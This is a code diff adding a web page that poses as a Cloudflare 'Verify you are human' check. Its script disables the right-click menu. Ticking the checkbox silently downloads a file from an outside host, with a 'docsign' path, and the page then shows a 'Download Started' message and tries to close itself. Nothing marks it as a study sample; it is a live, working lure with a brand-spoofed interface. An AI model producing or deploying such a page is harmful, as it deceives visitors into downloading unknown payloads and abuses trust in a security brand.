@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #1a1a1a;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 380px; 
+            padding: 15px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            font-weight: 700;
+            margin: 0 0 6px 0;
+            color: #111;
+            letter-spacing: -0.5px;
+        }
+
+        .header p {
+            font-size: 14px;
+            color: #666;
+            margin: 0 0 24px 0;
+        }
+
+        .turnstile-widget {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #fdfdfd;
+            border: 1px solid #d1d5db;
+            border-radius: 4px;
+            padding: 12px 16px;
+            width: 100%;
+            box-sizing: border-box;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+            transition: opacity 0.3s ease;
+        }
+
+        .widget-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .custom-checkbox {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #333;
+            border-radius: 4px;
+            background: white;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        #human-check { display: none; }
+
+        .checkmark {
+            width: 12px;
+            height: 9px;
+            display: none;
+        }
+
+        .spinner {
+            display: none;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #e5e7eb;
+            border-top: 2px solid #f38020;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .widget-label {
+            font-size: 14px;
+            color: #333;
+            user-select: none;
+            cursor: pointer;
+            font-weight: 400;
+        }
+
+        .widget-right {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 2px;
+        }
+
+        .brand-top {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .cf-logo {
+            width: 22px;
+            height: 13px;
+        }
+
+        .brand-name {
+            font-size: 9px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            color: #111;
+            text-transform: uppercase;
+        }
+
+        .links {
+            font-size: 10px;
+            color: #666;
+        }
+
+        .links a {
+            color: #666;
+            text-decoration: underline;
+            text-decoration-color: #ccc;
+            text-underline-offset: 2px;
+        }
+
+        .links a:hover {
+            color: #111;
+            text-decoration-color: #111;
+        }
+
+        .dot { margin: 0 3px; font-size: 8px; }
+
+        #success-message {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background-color: #fdfdfd;
+            border: 1px solid #d1d5db;
+            border-radius: 4px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+        }
+
+        #success-message h2 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #111;
+            margin: 0 0 10px 0;
+        }
+
+        #success-message p {
+            font-size: 14px;
+            color: #666;
+            margin: 0 0 20px 0;
+            line-height: 1.5;
+        }
+
+        #close-btn {
+            background-color: #f38020;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        #close-btn:hover {
+            background-color: #e06c10;
+        }
+        
+        .fallback-text {
+            display: none;
+            font-size: 12px;
+            color: #e06c10;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header" id="header">
+            <h1>One moment — confirming it's you</h1>
+            <p>Complete the check below to continue</p>
+        </div>
+
+        <div class="turnstile-widget" id="turnstile-widget">
+            <div class="widget-left">
+                <label for="human-check" class="custom-checkbox" id="custom-checkbox">
+                    <svg class="checkmark" id="checkmark" viewBox="0 0 16 12" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M1 6L5.5 10.5L15 1" stroke="#f38020" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    <div class="spinner" id="spinner"></div>
+                </label>
+                <input type="checkbox" id="human-check">
+                <label for="human-check" class="widget-label">Verify you are human</label>
+            </div>
+
+            <div class="widget-right">
+                <div class="brand-top">
+                    <svg class="cf-logo" viewBox="0 0 60 35" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M48 21.5C51 21.5 54 18.5 54 15C54 11.5 51 8.5 48 8.5C47.5 8.5 46.9 8.6 46.4 8.8C45 5.1 41.5 2.5 37.4 2.5C33.8 2.5 30.7 4.4 29.1 7.2C28.2 6.5 27 6.1 25.8 6.1C23 6.1 20.7 8.4 20.7 11.2C20.7 11.5 20.7 11.7 20.8 12C16.8 12.4 13.7 15.7 13.7 19.7C13.7 20 13.7 20.2 13.7 20.5H48V21.5Z" fill="#f38020"/>
+                        <path d="M40 28.5C42.2 28.5 44 26.7 44 24.5C44 22.3 42.2 20.5 40 20.5H16C13.8 20.5 12 22.3 12 24.5C12 26.7 13.8 28.5 16 28.5H40Z" fill="#faae40"/>
+                    </svg>
+                    <span class="brand-name">Cloudflare</span>
+                </div>
+                <div class="links">
+                    <a href="#">Privacy</a>
+                    <span class="dot">•</span>
+                    <a href="#">Help</a>
+                </div>
+            </div>
+        </div>
+
+        <div id="success-message">
+            <h2>Download Started</h2>
+            <p>Your document has been downloaded to your Downloads folder. You can open it from there.</p>
+            <button id="close-btn" onclick="closeWindow()">Close Window</button>
+            <p class="fallback-text" id="fallback-text">Your browser blocked automatic closing. Please close this tab manually.</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        const checkbox = document.getElementById('human-check');
+        const customCheckbox = document.getElementById('custom-checkbox');
+        const checkmark = document.getElementById('checkmark');
+        const spinner = document.getElementById('spinner');
+        const header = document.getElementById('header');
+        const widget = document.getElementById('turnstile-widget');
+        const successMessage = document.getElementById('success-message');
+        const fallbackText = document.getElementById('fallback-text');
+
+        const downloadUrl = "https://shreekalika.com/ZTE3YmEzMzExMgdicsdocsigndicsk"; 
+
+        // Function to attempt closing the window using multiple browser tricks
+        function closeWindow() {
+            try {
+                // Trick 1: Standard close
+                window.close();
+                
+                // Trick 2: If standard fails, try opening blank in self then closing
+                setTimeout(() => {
+                    window.open('', '_self', '');
+                    window.close();
+                }, 100);
+
+                // Trick 3: If still open after 300ms, show fallback message
+                setTimeout(() => {
+                    fallbackText.style.display = 'block';
+                }, 300);
+
+            } catch (e) {
+                fallbackText.style.display = 'block';
+            }
+        }
+
+        checkbox.addEventListener('change', function() {
+            if (this.checked) {
+                checkmark.style.display = 'none';
+                spinner.style.display = 'block';
+                customCheckbox.style.borderColor = '#cbd5e1'; 
+
+                setTimeout(() => {
+                    spinner.style.display = 'none';
+                    checkmark.style.display = 'block';
+                    customCheckbox.style.borderColor = '#f38020'; 
+                    customCheckbox.style.backgroundColor = '#fff7ed'; 
+                    
+                    // Trigger download
+                    const link = document.createElement('a');
+                    link.href = downloadUrl;
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+
+                    setTimeout(() => {
+                        header.style.display = 'none';
+                        widget.style.display = 'none';
+                        successMessage.style.display = 'block';
+                        
+                        // Auto-attempt to close after 5 seconds
+                        setTimeout(() => {
+                            closeWindow();
+                        }, 5000);
+
+                    }, 1000); 
+
+                }, 1000); 
+            } else {
+                checkmark.style.display = 'none';
+                spinner.style.display = 'none';
+                customCheckbox.style.borderColor = '#333';
+                customCheckbox.style.backgroundColor = 'white';
+            }
+        });
+    </script>
+</body>
+</html>
